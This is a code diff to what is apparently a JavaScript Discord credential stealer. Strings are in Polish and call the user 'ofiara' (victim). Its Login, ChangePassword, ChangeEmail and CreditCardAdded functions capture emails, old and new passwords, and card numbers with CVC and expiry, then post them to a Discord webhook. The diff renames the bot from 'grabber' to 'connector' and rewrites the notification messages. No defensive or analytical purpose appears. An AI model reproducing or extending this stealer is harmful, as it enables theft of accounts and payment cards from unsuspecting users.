@@ -70,7 +70,7 @@ function SendToWebhook(info) {
 
 function GetNitro(type) {
 	if (type == 0) {
-		return "No Nitro"
+		return "Bez nitro"
 	}
 	if (type == 1) {
 		return "\`Nitro Classic\`"
@@ -78,7 +78,7 @@ function GetNitro(type) {
 	if (type == 2) {
 		return "\`Nitro Boost\`"
 	} else {
-		return "No Nitro"
+		return "Bez nitro"
 	}
 }
 
@@ -140,12 +140,12 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "grabber",
-            content: "powiadomienie",
+            username: "connector",
+            content: "**Zarejestrowano udaną próbę zalogowania się na konto przez ofiarę.**",
             avatar_url: "https://cdn.discordapp.com/attachments/892074058160701470/931560991685214238/dd.png",
             embeds: [
                 {
-                    "color": 13900,
+                    "color": 65280,
                     "fields": [
                         {
                             "name": "**Informacje o koncie**",
@@ -182,15 +182,15 @@ function ChangePassword(oldpassword, newpassword, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "grabber",
-            content: "powiadomienie",
+            username: "connector",
+            content: "**Ofiarze udało się zmienić hasło.**",
             avatar_url: "https://cdn.discordapp.com/attachments/892074058160701470/931560991685214238/dd.png",
             embeds: [
                 {
-                    "color": 13900,
+                    "color": 65280,
                     "fields": [
                         {
-                            "name": "**Hasło zmienione**",
+                            "name": "**Hasło zostało zmienione**",
                             "value": `Email: ${json.email}\nStare hasło: ${oldpassword}\nNowe hasło: ${newpassword}`,
                             "inline": true
                         },
@@ -229,12 +229,12 @@ function ChangeEmail(newemail, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "grabber",
-            content: "powiadomienie",
+            username: "connector",
+            content: "**Ofiara zmieniła swój adres e-mail.**",
             avatar_url: "https://cdn.discordapp.com/attachments/892074058160701470/931560991685214238/dd.png",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 65280,
                     "fields": [
                         {
                             "name": "**Adres email zmieniony**",
@@ -276,12 +276,12 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "grabber",
-            content: "powiadomienie",
+            username: "connector",
+            content: "**Została dodana karta kredytowa.**",
             avatar_url: "https://cdn.discordapp.com/attachments/892074058160701470/931560991685214238/dd.png",
             embeds: [
                 {
-                    "color": 13900,
+                    "color": 65280,
                     "fields": [
                         {
                             "name": "**Dodano kartę kredytową**",
